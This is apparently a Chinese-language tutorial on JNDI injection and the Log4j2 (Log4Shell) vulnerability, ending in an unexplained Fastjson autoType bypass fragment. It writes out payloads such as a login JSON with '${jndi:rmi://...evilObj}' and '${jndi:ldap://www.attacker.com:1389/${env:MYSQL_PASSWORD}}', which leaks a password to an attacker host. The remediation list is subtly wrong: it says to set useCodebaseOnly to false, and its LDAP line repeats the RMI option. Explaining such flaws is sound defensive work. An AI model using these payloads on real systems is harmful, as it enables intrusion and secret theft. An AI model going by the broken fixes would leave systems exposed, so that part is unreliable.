# JNDI注入原理

# 原理

JNDI的全称为Java Naming and Directory Interface（java命名和目录接口）SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。

命名服务 命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务

目录服务 目录服务是命名服务的拓展。它与命名服务的区别在于它可以通过对象属性来检索对象，比如你要在某个学校里里找某个人，那么会通过：年级->班级->姓名这种方式来查找，年级、班级、姓名这些就是某个人的属性，这种层级关系就很像目录关系，所以这种存储对象的方式就叫目录服务。LDAP是典型的目录服务，这个我们暂且还没接触到，后文会提及

其实，仔细一琢磨就会感觉其实命名服务与目录服务的本质是一样的，都是通过键来查找对象，只不过目录服务的键要灵活且复杂一点。

JNDI

JNDI是对各种访问目录服务的逻辑进行了再封装，也就是以前我们访问RMI与LDAP要写的代码差别很大，但是有了JNDI这一层，我们就可以用JNDI的方式来轻松访问RMI或者LDAP服务，这样访问不同的服务的代码实现基本是一样的。

# RMI

首先来看下一些基础知识点

RMI会通过远程调用的方式将远程的类或方法调用至本地

具体RMI调用请见跳转：RMI 远程调用

所以只要满足下面条件，就可以发起渗透攻击

  1. 只要服务端的对象提供了一个方法，这个方法接收的是一个Object类型的参数
  2. 远程服务器的classpath中存在可利用pop链，那么我们就可以通过在客户端调用这个方法，并传递一个精心构造的对象的方式来攻击rmi服务。

RMI方式注入与LDAP方式注入的原理是一样的，都是使用远程方式加载类，并进行实例化调用，只不过调用的方式不同而已，

# Log4j2的JNDI注入漏洞

# 漏洞原因

Log4j2文档：https://logging.apache.org/log4j/2.x/manual/lookups.html

漏洞：

  • https://x.threatbook.cn/v5/article?threatInfoID=10470
  • https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3202?filter=addedrecently

Log4j (opens new window) 是一个 Java 语言的库（library）主要用来打印记录系统服务日志。并且Log4j 是最主流、常用的 Java 库之一，它的代码遍及各类主流软件和服务；

Log4j 是根据配置文件中设定的「模板」来记录日志的。为了增加灵活性，Log4j 的模板中可以留下一些特殊语法的「待定内容」；在实际生成日志时，Log4j 会根据这些语法的指示，通过检索、查询、计算，将这些待定内容替换为实际内容，记录到日志里——正如上面那个记录员通过翻日历、看手表、查花名册，补齐访客记录里的空档一样。

Log4j2中在打印日志的时候会将${xxx}转义成相关属性打印出来，并且这个功能是默认开启的

比如：打印${java:version}，最后会打印出Java version 1.8.0_311；打印${date:yyyy-MM-dd}，那么 Log4j 就会将其替换为形如 2021-12-10 的当前日期记录下来

除了这些比较常规的待定内容，Log4j 还支持一种更为复杂的替换方式，称为 JNDI 查询。JNDI（Java Naming and Directory Interface）是 Java 的一项内置功能，它允许 Java 程序在一个目录——可以想象为一个花名册或电话本——中查询数据。而通过JNDI可以调用LDAP和RMI服务。

这样的话，黑客就可以在请求一些接口或者提交表单的时候，传入${java:version}等相关可转义的参数，此时，如果程序中会打印该参数，就会转义该字符。

虽然打印一些日志不会出现什么大问题，顶多是日志输出异常，但是Java中的JNDI请求也会被转义

比如，黑客在登录接口的请求参数中传入Json为

{
    "username": "${jndi:rmi://10.x.1.101:1099/evilObj}",
    "password": "${jndi:ldap://10.1.1.101:9999/evilObj}"
}

当输入该行日志时，本地的Log4j2就会转义，然后调用JNDI，发起远程调用，而这个远程调用的地址是黑客指定的地址，被攻击者就会拉取到黑客的攻击代码并且该代码会被执行。

# 网民们发现的的漏洞

例如，在下面的截图中，攻击者将构造的字符串作为用户名来登录 iCloud 账户。显然，这个字符串进入了 iCloud 服务器的日志中，进而触发漏洞，访问了字符串中所包含的域名：

类似地，在下面的 QQ 邮箱截图中，攻击者将构造的字符串填进了邮箱的搜索框，同样导致了腾讯服务器被记录：

因为 JNDI 查询的语法是可以嵌套的，这进一步将可能泄露的内容范围，扩大到了**任何 Log4j 所能接触到的运行环境信息。**正如一些用户在 GitHub 上的漏洞讨论中指出 (opens new window)，形如 ${jndi:ldap://www.attacker.com:1389/${env:MYSQL_PASSWORD} 的恶意日志，就会引导 Log4j 首先将内层的 ${env:MYSQL_PASSWORD} 替换为真实的 MySQL 数据库密码，然后通过 URL 泄露给 www.attacker.com。

此外，注意到 JNDI 的本意在于查询——不仅是发出请求，而且会记录和处理查询结果，因此这个漏洞不仅会导致服务器信息泄漏，而且允许攻击者向服务器传递任意危险内容，可能还包括执行恶意代码。 例如，一个正常的 LDAP 服务器在收到查询请求时，返回的只是查询到的用户信息。但如果这是一个攻击者控制的「假」LDAP 服务器，那么它可以返回任意恶意内容——例如一段包含窃取或破坏功能的代码。

真实案例：攻击者将一段使用 base64 编码的终端脚本附在 JNDI 查询指令中，导致被攻击机器下载并安装了挖矿程序：

这种利用程序不经检查地将文本信息还原为对象的功能，注入和执行恶意代码的漏洞，术语称之为 「反序列化漏洞」（deserialization vulnerabilities），类似相关的漏洞还有FastJson，也是利用反序列化进行注入攻击的RM或LDAP地址，在被攻击服务上执行恶意脚本，并获取被攻击者服务的信息

# 影响范围

Log4j 2.x --- 2.14.1

官方已经在2.15.0默认关闭了该功能

因为很多开源组件都使用Log4j2，此次漏洞涉及的范围是很广的，大家判断自己的项目中判断是否存在该漏洞，根据以下条件判断

  • Log4j 2.x --- 2.14.1
  • JDK
    • JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
    • JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
    • JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

# 如何解决

  1. 升级Log4j2版本至2.15.0以上
  2. 禁用 RMI 和 LADP
    • JDK 6u45、7u21之后设置java.rmi.server.useCodebaseOnly为false
    • JDK 6u141、7u131、8u121之后设置com.sun.jndi.rmi.object.trustURLCodebase为false
    • JDK 6u211、7u201、8u191之后设置com.sun.jndi.rmi.object.trustURLCodebase为false
  3. 过滤相关攻击关键字的参数
  4. 增加安全产品

传递两个对象，第一次进行 autoType 检查的时候，会加载到一个缓存 mapping 中，第二次就会跳过家检查。

  • 类 com.alibaba.fastjson.util.TypeUtils
    • checkAutoType()
      • autoTypeSupport 默认为 False ，就会尝试从 mapping 或者 deserializers.findClass 中加载类
    • 属性deserializers的findClass方法
      • 方法 findClass 会根据参数 java.lang.Class 返回类 java.lang.Class
    • loadClass 方法会将属性 val 的值： com.sun.rowset.JdbcRowSetImpl 加入到缓存mapping中
    • 而我们传了两个对象，会再次调用 checkAutoType()
      • 而这次校检， mapping 中会存储类型com.sun.rowset.JdbcRowSetImpl，因此会在 AutoType 机制检查前就结束 checkAutoType() ，并且返回Class<?> = com.sun.rowset.JdbcRowSetImpl。
      • 这样就会绕过 AutoType 检查，调用远程的代码，达到攻击的效果
